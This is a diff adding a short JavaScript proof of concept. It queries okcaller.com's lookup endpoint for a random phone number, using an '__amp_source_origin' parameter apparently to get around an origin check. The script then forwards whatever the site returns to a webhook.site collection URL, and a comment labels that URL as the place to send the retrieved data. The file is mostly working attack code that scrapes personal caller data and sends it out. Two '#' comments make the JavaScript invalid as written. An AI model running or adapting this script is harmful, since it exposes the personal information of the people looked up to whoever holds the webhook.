@@ -1,0 +1,44 @@
+function randomIntFromInterval(min, max) { // min and max included 
+  return Math.floor(Math.random() * (max - min + 1) + min)
+}
+
+const rndInt = randomIntFromInterval(2120000000, 2129999999) #random phone number input
+console.log(rndInt)
+
+const xhr = new XMLHttpRequest();
+xhr.open("GET", "https://www.okcaller.com/jason.php?number=" + rndInt + "&__amp_source_origin=https://www.okcaller.com", true); 
+xhr.responseType = "text";
+
+xhr.onload = () => {
+  if (xhr.readyState === xhr.DONE) {
+    if (xhr.status === 200) {
+      // Assuming the response is in JSON format
+      const responseData = JSON.parse(xhr.responseText);
+
+      // Now, let's send a POST request with the received data
+      const postXhr = new XMLHttpRequest();
+      postXhr.open("POST", "https://webhook.site/9bd73d60-7e58-4dce-b179-454b175848dc", true);  #webhook to send retrived data
+      postXhr.setRequestHeader("Content-Type", "application/json");
+
+      // Convert the received data to JSON string
+      const postData = JSON.stringify(responseData);
+
+      postXhr.onload = () => {
+        if (postXhr.readyState === postXhr.DONE) {
+          // Handle the response of the POST request
+          if (postXhr.status === 200) {
+            console.log("POST request successful");
+            console.log(postXhr.response);
+          } else {
+            console.log("POST request failed");
+          }
+        }
+      };
+
+      // Send the POST request with the received data
+      postXhr.send(postData);
+    }
+  }
+};
+
+xhr.send(null);
